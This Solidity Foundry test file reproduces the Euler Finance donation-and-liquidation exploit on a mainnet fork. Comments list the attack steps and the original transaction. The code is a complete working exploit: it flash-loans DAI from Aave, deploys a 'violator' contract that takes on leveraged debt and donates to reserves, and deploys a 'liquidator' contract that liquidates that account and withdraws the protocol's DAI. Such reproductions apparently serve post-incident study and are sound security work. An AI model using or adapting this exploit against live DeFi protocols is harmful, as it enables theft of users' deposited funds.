// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/FrankResearcher/status/1635241475989721089
// https://twitter.com/nomorebear/status/1635230621856600064
// https://twitter.com/peckshield/status/1635229594596036608
// https://twitter.com/BlockSecTeam/status/1635262150624305153
// https://twitter.com/SlowMist_Team/status/1635288963580825606
// @TX
// https://etherscan.io/tx/0xc310a0affe2169d1f6feec1c63dbc7f7c62a887fa48795d327d4d2da2d6b111d
// @Summary
// 1) Flash loan tokens from Balancer/Aave v2 => 30M DAI
// 2) Deploy two contracts: violator and liquidator
// 3) Deposit 2/3 of funds to Euler using deposit() => sent 20M DAI to Euler and received 19.5M eDAI from Euler
// 4) Borrow 10x of deposited amount using mint() => received 195.6M eDAI and 200M dDAI from Euler
// 5) Repay part of debt using the remaining 1/3 of funds using repay() => sent 10M DAI and burned 10M dDAI
// 6) Repeat 4th step => received 195.6M eDAI and 200M dDAI from Euler
// 7) Donate 10x of repaid funds using donateToReserves() => sent 100M eDAI to Euler
// 8)  Liquidate a violator’s account using liquidate() because eDAI < dDAI => received 310M eDAI and 259M dDAI of debt from the violator
// 9) Withdraw all token amount from Euler using withdraw() => withdrew 38.9M DAI from Euler
// 10) Repay flash loans

interface EToken {
    function deposit(uint256 subAccountId, uint256 amount) external;
    function mint(uint256 subAccountId, uint256 amount) external;
    function donateToReserves(uint256 subAccountId, uint256 amount) external;
    function withdraw(uint256 subAccountId, uint256 amount) external;
}

interface DToken {
    function repay(uint256 subAccountId, uint256 amount) external;
}

interface IEuler {
    struct LiquidationOpportunity {
        uint256 repay;
        uint256 yield;
        uint256 healthScore;
        uint256 baseDiscount;
        uint256 discount;
        uint256 conversionRate;
    }

    function liquidate(
        address violator,
        address underlying,
        address collateral,
        uint256 repay,
        uint256 minYield
    ) external;
    function checkLiquidation(
        address liquidator,
        address violator,
        address underlying,
        address collateral
    ) external returns (LiquidationOpportunity memory liqOpp);
}

contract ContractTest is Test {
    IERC20 DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    EToken eDAI = EToken(0xe025E3ca2bE02316033184551D4d3Aa22024D9DC);
    DToken dDAI = DToken(0x6085Bc95F506c326DCBCD7A6dd6c79FBc18d4686);
    IEuler Euler = IEuler(0xf43ce1d09050BAfd6980dD43Cde2aB9F18C85b34);
    IAaveFlashloan AaveV2 = IAaveFlashloan(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    address Euler_Protocol = 0x27182842E098f60e3D576794A5bFFb0777E025d3;
    Iviolator violator;
    Iliquidator liquidator;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 16_817_995);
        cheats.label(address(DAI), "DAI");
        cheats.label(address(eDAI), "eDAI");
        cheats.label(address(dDAI), "dDAI");
        cheats.label(address(Euler), "Euler");
        cheats.label(address(AaveV2), "AaveV2");
    }

    function testExploit() public {
        uint256 aaveFlashLoanAmount = 30_000_000 * 1e18;
        address[] memory assets = new address[](1);
        assets[0] = address(DAI);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = aaveFlashLoanAmount;
        uint256[] memory modes = new uint[](1);
        modes[0] = 0;
        bytes memory params =
            abi.encode(30_000_000, 200_000_000, 100_000_000, 44_000_000, address(DAI), address(eDAI), address(dDAI));
        AaveV2.flashLoan(address(this), assets, amounts, modes, address(this), params, 0);

        emit log_named_decimal_uint("Attacker DAI balance after exploit", DAI.balanceOf(address(this)), DAI.decimals());
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initator,
        bytes calldata params
    ) external returns (bool) {
        DAI.approve(address(AaveV2), type(uint256).max);
        violator = new Iviolator();
        liquidator = new Iliquidator();
        DAI.transfer(address(violator), DAI.balanceOf(address(this)));
        violator.violator();
        liquidator.liquidate(address(liquidator), address(violator));
        return true;
    }
}

contract Iviolator {
    IERC20 DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    EToken eDAI = EToken(0xe025E3ca2bE02316033184551D4d3Aa22024D9DC);
    DToken dDAI = DToken(0x6085Bc95F506c326DCBCD7A6dd6c79FBc18d4686);
    IEuler Euler = IEuler(0xf43ce1d09050BAfd6980dD43Cde2aB9F18C85b34);
    address Euler_Protocol = 0x27182842E098f60e3D576794A5bFFb0777E025d3;

    function violator() external {
        DAI.approve(Euler_Protocol, type(uint256).max);
        eDAI.deposit(0, 20_000_000 * 1e18);
        eDAI.mint(0, 200_000_000 * 1e18);
        dDAI.repay(0, 10_000_000 * 1e18);
        eDAI.mint(0, 200_000_000 * 1e18);
        eDAI.donateToReserves(0, 100_000_000 * 1e18);
    }
}

contract Iliquidator {
    IERC20 DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    EToken eDAI = EToken(0xe025E3ca2bE02316033184551D4d3Aa22024D9DC);
    DToken dDAI = DToken(0x6085Bc95F506c326DCBCD7A6dd6c79FBc18d4686);
    IEuler Euler = IEuler(0xf43ce1d09050BAfd6980dD43Cde2aB9F18C85b34);
    address Euler_Protocol = 0x27182842E098f60e3D576794A5bFFb0777E025d3;

    function liquidate(address liquidator, address violator) external {
        IEuler.LiquidationOpportunity memory returnData =
            Euler.checkLiquidation(liquidator, violator, address(DAI), address(DAI));
        Euler.liquidate(violator, address(DAI), address(DAI), returnData.repay, returnData.yield);
        eDAI.withdraw(0, DAI.balanceOf(Euler_Protocol));
        DAI.transfer(msg.sender, DAI.balanceOf(address(this)));
    }
}
